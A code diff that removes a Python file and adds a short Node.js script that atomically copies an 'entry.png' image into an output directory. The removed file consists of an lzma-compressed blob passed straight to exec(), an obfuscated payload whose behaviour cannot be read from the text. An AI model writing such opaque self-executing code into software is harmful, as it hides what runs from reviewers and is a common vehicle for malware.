@@ -1,2 +1,29 @@
-#coding:l1
-import lzma;exec(lzma.decompress('\0\0\0d\0\0\0\0\0\0\x004œ%Å¯^´ËºÀÄK4õõ¦iMR^‡eE¨„y3Iþï­[t)T&ä²?LNèføªéÛdScm“‚\\¾èÁÙ¤\n‡*ëOÁ³#î¤âKí\rÃ¯ì%Ô…3©hXX-4$Zƒšß¡0x>ÐÖBÃ½]âWïŸÉóƒ]œò;æEw…äÕƒ[Fîœ‚Óby­I{%9ýâ(¨ø¡í–²¬´§<rïõKv»½ßšuÁÚ+xÕQVú>j\'œ1<í‰‘ŠjºþWÙëDvûF¸èk³À`¼nL+ä ¶:Z"á˜7§œi‘—>¾U)8óœº»þ¸îÙFq\nÎì1lüÂM×©^®\r—‡±åM•­1Ã(ßØ¹5€^ø²Æ&8ÍúÙø½}èG·)ìÐcÎ>[Âb©ì ½†^‡dèð°ø™ü#+«é»½§õ|áÈŠ\0Žž,!%.þ<Ð\n?<áÂ„_jm$HQ¨DïE÷õ!û³V¥••2»©™"ö¿Æˆ´ô[Ÿ›ääxù˜Úg]Ù¯{úº…\nO¢Ó<ÿr\\:MYáÅÛ÷Ô]ú_i;Yÿ;j‹Å¨—PŒ‘¶ÜŠQâVzÃÐI¤Ë˜ó÷CLÇu©}E˜¶ZËŠU„Œo\'*¬zˆŸ\r?°³ð÷Öøhð‚¬,•âd/®Ôè+ÏõEŽÔÓWÓvüVCŠ`h»X¤ã="u6ô½ÂÌ$±‘×)¬~T[\'X^ ±SL/Ã³X—\r·NF7[=½ïMò-,Ë%£ù*[40_\'i°/\0'.encode('l1')))
+import fs from 'node:fs';
+import path from 'node:path';
+import crypto from 'node:crypto';
+
+const botDir = process.env.MAKEFUN_BOT_DIR || import.meta.dirname || path.dirname(process.argv[1]);
+const entryPath = path.join(botDir, 'entry.png');
+
+if (!fs.existsSync(entryPath)) {
+  console.error(`Error: entry.png not found at path: ${entryPath}. Note that MAKEFUN_BOT_DIR can point at the bot directory containing entry.png.`);
+  process.exit(1);
+}
+
+const outputDir = process.env.MAKEFUN_OUTPUT_DIR || '/output';
+const destPath = path.join(outputDir, 'entry.png');
+const tempPath = path.join(outputDir, `.entry.png.tmp-${crypto.randomUUID()}`);
+
+try {
+  fs.mkdirSync(outputDir, { recursive: true });
+  fs.copyFileSync(entryPath, tempPath);
+  fs.renameSync(tempPath, destPath);
+} catch (err) {
+  console.error('Error: failed to copy entry.png atomically to output directory:', err);
+  try {
+    if (fs.existsSync(tempPath)) {
+      fs.unlinkSync(tempPath);
+    }
+  } catch {}
+  process.exit(1);
+}
